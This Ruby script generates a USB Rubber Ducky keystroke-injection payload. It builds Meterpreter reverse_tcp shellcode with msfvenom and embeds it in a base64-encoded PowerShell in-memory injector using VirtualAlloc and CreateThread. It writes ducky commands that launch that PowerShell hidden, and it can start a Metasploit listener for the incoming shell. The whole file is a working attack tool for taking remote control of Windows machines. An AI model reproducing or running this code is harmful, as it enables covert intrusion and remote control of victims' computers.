#!/usr/bin/env ruby
# Thanks to @mattifestation exploit-monday.com and Dave Kennedy.
# Written by James Cook @b00stfr3ak44
require 'base64'
def print_error(text)
	print "\e[31m[-]\e[0m #{text}"
end
def print_success(text)
	print "\e[32m[+]\e[0m #{text}"
end
def print_info(text)
	print "\e[34m[*]\e[0m #{text}"
end
def get_input(text)
	print "\e[33m[!]\e[0m #{text}"
end
def get_host()
  host_name = [(get_input("Enter the host ip to listen on: ") ), $stdin.gets.rstrip][1]
  ip = host_name.split('.')
  if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil
   	print_error("Not a valid IP\n") 
   	get_host()
  end
   	print_success("Using #{host_name} as server\n")
   	return host_name
end
def get_port()
  port = [(get_input("Enter the port you would like to use or leave blank for [443]: ") ), $stdin.gets.rstrip][1]
  if port == ''
    port = '443'
    print_success("Using #{port}\n")
    return port
  elsif not (1..65535).cover?(port.to_i)
    print_error("Not a valid port\n")
    sleep(1)
    port()
  else 
    print_success("Using #{port}\n")
    return port
   	end
end
def shellcode_gen(msf_path,host,port)
	print_info("Generating shellcode\n")
	execute  = `#{msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
	shellcode = clean_shellcode(execute)
	powershell_command = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})  
  encoded_command = Base64.encode64(powershell_command.encode("utf-16le")).delete("\r\n")
  return encoded_command
end
def clean_shellcode(shellcode)
  shellcode = shellcode.gsub('\\',",0")
  shellcode = shellcode.delete("+")
  shellcode = shellcode.delete('"')
  shellcode = shellcode.delete("\n")
  shellcode = shellcode.delete("\s")
  shellcode[0..4] = ''
  return shellcode
end
def ducky_setup(encoded_command)
	print_info("Writing to file\n")
  File.open("powershell_reverse_ducky.txt",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
	print_success("File Complete\n")
end
def metasploit_setup(msf_path,host,port)
	print_info("Setting up Metasploit this may take a moment\n")
	rc_file = "msf_listener.rc"
	file = File.open("#{rc_file}",'w')
	file.write("use exploit/multi/handler\n")
  file.write("set PAYLOAD #{@set_payload}\n")
  file.write("set LHOST #{host}\n")
  file.write("set LPORT #{port}\n")
  file.write("set EnableStageEncoding true\n")
  file.write("set ExitOnSession false\n")
  file.write("exploit -j")
  file.close
  system("#{msf_path}./msfconsole -r #{rc_file}")
end
begin
	msf_path = "/opt/metasploit-framework/"
	@set_payload = "windows/meterpreter/reverse_tcp"
	host = get_host()
	port = get_port()
	encoded_command = shellcode_gen(msf_path,host,port)
	ducky_setup(encoded_command)
	msf_setup = [(get_input("Would you like to start the listener?[yes/no] ") ), $stdin.gets.rstrip][1]
	print_info("Compile powershell_reverse_ducky.txt with duckencode.jar\n")
	metasploit_setup(msf_path,host,port) if msf_setup == 'yes'
	print_info("Good Bye!\n")
end
